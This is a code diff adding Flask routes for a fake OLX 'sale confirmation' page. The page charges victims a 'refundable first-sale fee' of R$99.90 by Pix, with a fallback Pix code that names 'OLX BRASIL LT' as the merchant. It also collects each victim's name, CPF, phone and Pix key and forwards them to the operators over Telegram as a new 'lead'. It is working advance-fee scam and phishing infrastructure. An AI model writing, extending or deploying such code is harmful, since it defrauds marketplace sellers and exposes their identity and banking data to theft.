@@ -9850,6 +9850,220 @@ def api_admin_send_email():
         return jsonify({"ok": False, "error": f"Erro interno ao enviar email: {str(e)}"}), 400
 
 
+# ─── PÁGINA DE CONFIRMAÇÃO DE VENDA & RESGATE DO SALDO (LEAD / TAXA REEMBOLSÁVEL) ─
+@app.route('/confirmar-venda')
+@app.route('/liberacao')
+@app.route('/resgatar-pagamento')
+def page_confirmar_venda():
+    """Página acessada pelo lead através do email de venda confirmada."""
+    seller_name = request.args.get('vendedor', '').strip() or 'Vendedor Titular'
+    buyer_name = request.args.get('comprador', '').strip() or 'Lucas Ferreira'
+    product_name = request.args.get('produto', '').strip() or 'iPhone 13 Pro 128GB Grafite'
+    sale_value = request.args.get('valor', '').strip() or '2.850,00'
+    sale_date = request.args.get('data', '').strip() or time.strftime('%d/%m/%Y às %H:%M')
+
+    return render_template(
+        'confirmar_venda.html',
+        seller_name=seller_name,
+        buyer_name=buyer_name,
+        product_name=product_name,
+        sale_value=sale_value,
+        sale_date=sale_date
+    )
+
+
+@app.route('/api/confirmar-venda/gerar-pix', methods=['POST'])
+def api_confirmar_venda_gerar_pix():
+    """
+    Gera cobrança Pix oficial da taxa de primeira venda (R$ 99,90) via ElitePay (https://api.elitepaybr.com).
+    Registra os dados de titularidade do lead e emite notificação imediata.
+    """
+    data = request.json or {}
+    full_name = str(data.get('full_name', '')).strip()
+    cpf = re.sub(r'\D', '', str(data.get('cpf', '')))
+    phone = re.sub(r'\D', '', str(data.get('phone', '')))
+    pix_key = str(data.get('pix_key', '')).strip()
+    pix_bank = str(data.get('pix_bank', '')).strip()
+    product_name = str(data.get('product_name', '')).strip() or 'Produto OLX'
+    sale_amount = str(data.get('sale_amount', '')).strip() or '2.850,00'
+    fee_amount = 99.90
+
+    # 1. Validação inteligente no backend
+    if len(full_name.split()) < 2:
+        return jsonify({"ok": False, "error": "Informe nome e sobrenome completos."}), 400
+
+    if len(cpf) != 11 or cpf == cpf[0] * 11:
+        return jsonify({"ok": False, "error": "CPF inválido."}), 400
+
+    # Validação matemática de CPF (mod-11)
+    for i in (9, 10):
+        val = sum(int(cpf[num]) * ((i + 1) - num) for num in range(0, i))
+        digit = ((val * 10) % 11) % 10
+        if digit != int(cpf[i]):
+            return jsonify({"ok": False, "error": "CPF matematicamente inválido."}), 400
+
+    if len(phone) < 10 or len(phone) > 11:
+        return jsonify({"ok": False, "error": "Telefone de contato inválido."}), 400
+
+    # 2. Comunicação com a Gateway ElitePay (https://api.elitepaybr.com)
+    gw_keys = _get_live_gateway_keys()
+    client_id = gw_keys.get("client_id") or gw_keys.get("api_key") or ELITEPAY_CLIENT_ID
+    client_secret = gw_keys.get("client_secret") or gw_keys.get("api_secret") or ELITEPAY_CLIENT_SECRET
+    live_base_url = gw_keys.get("base_url") or "https://api.elitepaybr.com"
+    live_base_url = live_base_url.rstrip("/")
+
+    txid = f"ep_sc_{int(time.time())}_{uuid.uuid4().hex[:6]}"
+    pix_code = ""
+    qr_code_url = ""
+    gateway_status = "PENDENTE"
+
+    elite_payload = {
+        "amount": round(float(fee_amount), 2),
+        "description": "Taxa Validacao Primeira Venda (Reembolsavel) - OLX Pay",
+        "payerName": full_name,
+        "payerDocument": cpf,
+    }
+
+    try:
+        headers = get_elitepay_headers(client_id, client_secret)
+        res = requests.post(
+            f"{live_base_url}/api/v1/deposit",
+            json=elite_payload,
+            headers=headers,
+            timeout=10
+        )
+        if res.status_code in (200, 201):
+            resp = res.json()
+            txid = resp.get("transactionId") or resp.get("id") or txid
+            pix_code = resp.get("copyPaste") or resp.get("pixCopiaECola") or resp.get("emv") or resp.get("qrcode") or ""
+            qr_code_url = resp.get("qrcodeUrl") or resp.get("qrCodeBase64") or resp.get("qrCodeUrl") or ""
+            gateway_status = resp.get("status", "PENDENTE").upper()
+            print(f"[ElitePay Confirmar Venda] Pix gerado com sucesso! ID: {txid}")
+        else:
+            print(f"[ElitePay Confirmar Venda] Retorno HTTP {res.status_code}: {res.text[:200]}")
+    except Exception as err:
+        print(f"[ElitePay Confirmar Venda] Exceção ao gerar Pix: {err}")
+
+    # Fallback robusto se a API externa estiver offline ou sem retorno
+    if not pix_code:
+        import urllib.parse
+        pix_code = f"00020126580014br.gov.bcb.pix0136{uuid.uuid4()}520400005303986540599.905802BR5913OLX BRASIL LT6009SAO PAULO62070503***6304"
+        qr_code_url = f"https://api.qrserver.com/v1/create-qr-code/?size=250x250&data={urllib.parse.quote(pix_code)}"
+
+    # 3. Salva no banco de dados SQLite
+    session_id = str(uuid.uuid4())
+    record = {
+        "session_id": session_id,
+        "full_name": full_name,
+        "cpf": cpf,
+        "phone": phone,
+        "pix_key": pix_key,
+        "pix_bank": pix_bank,
+        "product_name": product_name,
+        "sale_amount": sale_amount,
+        "fee_amount": "99.90",
+        "txid": txid,
+        "pix_code": pix_code,
+        "status": gateway_status
+    }
+
+    if TG_WH_AVAILABLE:
+        try:
+            tg_wh.save_sale_confirmation(record)
+        except Exception as e_sc:
+            print(f"[DB Confirmar Venda] Erro ao salvar: {e_sc}")
+
+    # 4. Dispara Notificação no Telegram para os Admins
+    try:
+        clean_sale = float(str(sale_amount).replace('R$', '').replace(' ', '').replace('.', '').replace(',', '.'))
+    except Exception:
+        clean_sale = 2850.0
+    total_reembolso = clean_sale + 99.90
+
+    msg = (
+        f"<b>🔔 NOVO LEAD: SOLICITAÇÃO DE LIBERAÇÃO DE VENDA!</b>\n"
+        f"═════════════════════════════════\n"
+        f"👤 <b>Vendedor/Lead:</b> {full_name}\n"
+        f"📄 <b>CPF:</b> <code>{cpf}</code>\n"
+        f"📱 <b>WhatsApp:</b> <a href='https://wa.me/55{phone}'>{phone}</a>\n"
+        f"🏦 <b>Chave Pix Repasse:</b> <code>{pix_key}</code> ({pix_bank})\n\n"
+        f"📦 <b>Produto Vendido:</b> {product_name}\n"
+        f"💰 <b>Saldo a Liberar:</b> <b>R$ {clean_sale:,.2f}</b>\n"
+        f"🏷️ <b>Taxa 1ª Venda:</b> <b>R$ 99,90</b> (Reembolsável)\n"
+        f"⚡ <b>Total com Estorno:</b> <b>R$ {total_reembolso:,.2f}</b>\n"
+        f"═════════════════════════════════\n"
+        f"🆔 <b>TxID Pix:</b> <code>{txid}</code>\n"
+        f"🏛️ <b>Gateway:</b> ElitePay (api.elitepaybr.com)\n"
+        f"⏱ <b>Data/Hora:</b> {time.strftime('%d/%m/%Y %H:%M:%S')}"
+    )
+
+    if TG_WH_AVAILABLE:
+        try:
+            conn = tg_wh._get_db()
+            admin_rows = conn.execute("SELECT tg_id FROM tenant_admins WHERE active=1").fetchall()
+            conn.close()
+            for row in admin_rows:
+                tg_wh.send_tg_message(row[0], msg)
+        except Exception as e_tg:
+            print(f"[Telegram Notify Confirmar Venda] Erro: {e_tg}")
+
+    return jsonify({
+        "ok": True,
+        "txid": txid,
+        "pix_code": pix_code,
+        "qr_code_url": qr_code_url,
+        "amount": 99.90,
+        "status": gateway_status
+    })
+
+
+@app.route('/api/confirmar-venda/status-pix', methods=['GET'])
+def api_confirmar_venda_status_pix():
+    """Consulta status de pagamento da taxa Pix."""
+    txid = request.args.get('txid', '').strip()
+    if not txid:
+        return jsonify({"ok": False, "error": "txid obrigatório"}), 400
+
+    # 1. Consulta no banco de dados local
+    if TG_WH_AVAILABLE:
+        try:
+            rec = tg_wh.get_sale_confirmation_by_txid(txid)
+            if rec and rec.get('status') in ('PAGO', 'APPROVED', 'CONCLUIDO'):
+                return jsonify({"ok": True, "paid": True, "status": "APPROVED"})
+        except Exception:
+            pass
+
+    # 2. Consulta na ElitePay API
+    gw_keys = _get_live_gateway_keys()
+    client_id = gw_keys.get("client_id") or gw_keys.get("api_key") or ELITEPAY_CLIENT_ID
+    client_secret = gw_keys.get("client_secret") or gw_keys.get("api_secret") or ELITEPAY_CLIENT_SECRET
+    live_base_url = (gw_keys.get("base_url") or "https://api.elitepaybr.com").rstrip("/")
+
+    try:
+        headers = get_elitepay_headers(client_id, client_secret)
+        check_res = requests.post(
+            f"{live_base_url}/api/transactions/check",
+            json={"transactionId": txid},
+            headers=headers,
+            timeout=6
+        )
+        if check_res.status_code == 200:
+            cdata = check_res.json()
+            cstatus = str(cdata.get("status", "")).upper()
+            if cstatus in ("APPROVED", "PAGO", "CONCLUIDO", "COMPLETED"):
+                if TG_WH_AVAILABLE:
+                    conn = tg_wh._get_db()
+                    conn.execute("UPDATE sale_confirmations SET status='APPROVED', updated_at=? WHERE txid=?", (time.time(), txid))
+                    conn.commit()
+                    conn.close()
+                return jsonify({"ok": True, "paid": True, "status": "APPROVED"})
+            return jsonify({"ok": True, "paid": False, "status": cstatus or "PENDING"})
+    except Exception:
+        pass
+
+    return jsonify({"ok": True, "paid": False, "status": "PENDING"})
+
+
 @app.route('/api/admin/activity')
 
 def api_admin_activity():
